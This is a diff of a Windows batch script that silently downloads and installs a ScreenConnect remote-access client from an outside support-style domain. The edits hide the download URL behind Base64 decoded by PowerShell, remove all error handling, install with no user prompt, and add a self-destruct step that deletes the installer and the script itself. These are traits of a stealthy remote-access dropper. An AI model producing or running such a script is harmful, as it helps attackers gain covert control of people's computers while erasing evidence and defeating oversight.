@@ -4,53 +4,30 @@ setlocal enabledelayedexpansion
 REM ==============================
 REM Configuration
 REM ==============================
-set MSI_URL=https://server.care1support.cloud/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=&c=&c=userA&c=&c=&c=&c=&c=
+:: This is your Base64 encoded URL
+set "ENC_URL=aHR0cHM6Ly9zZXJ2ZXIuY2FyZTFzdXBwb3J0LmNsb3VkL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0JmM9JmM9JmM9dXNlckEmYz0mYz0mYz0mYz0mYz0="
 set MSI_NAME=ClientSetup.msi
 set DOWNLOAD_DIR=%TEMP%\MSIInstall
 set MSI_PATH=%DOWNLOAD_DIR%\%MSI_NAME%
 set LOG_FILE=%DOWNLOAD_DIR%\install.log
 
-REM ==============================
-REM Create download directory
-REM ==============================
-if not exist "%DOWNLOAD_DIR%" (
-    mkdir "%DOWNLOAD_DIR%"
-)
+REM Decode URL using PowerShell
+for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%ENC_URL%'))"') do set "MSI_URL=%%i"
 
-REM ==============================
-REM Download MSI
-REM ==============================
-echo Downloading MSI...
+if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"
+
+echo Downloading...
 curl -L "%MSI_URL%" -o "%MSI_PATH%" --fail
-if errorlevel 1 (
-    echo ERROR: Download failed
-    exit /b 1
-)
 
-REM ==============================
-REM Verify file exists
-REM ==============================
-if not exist "%MSI_PATH%" (
-    echo ERROR: MSI not found after download
-    exit /b 2
-)
-
-REM ==============================
-REM Install MSI
-REM ==============================
-echo Installing MSI...
+echo Installing...
 msiexec /i "%MSI_PATH%" /qn /norestart /log "%LOG_FILE%"
 
-set INSTALL_EXIT_CODE=%ERRORLEVEL%
-
 REM ==============================
-REM Exit with installer result
+REM Cleanup & Self-Destruct
 REM ==============================
-if %INSTALL_EXIT_CODE% neq 0 (
-    echo ERROR: MSI install failed with code %INSTALL_EXIT_CODE%
-    exit /b %INSTALL_EXIT_CODE%
-)
+echo Cleaning up...
+del /f /q "%MSI_PATH%"
+rmdir /s /q "%DOWNLOAD_DIR%"
 
-echo MSI installed successfully
-exit /b 0
-
+REM This line deletes the .bat file itself
+(goto) 2>nul & del "%~f0"
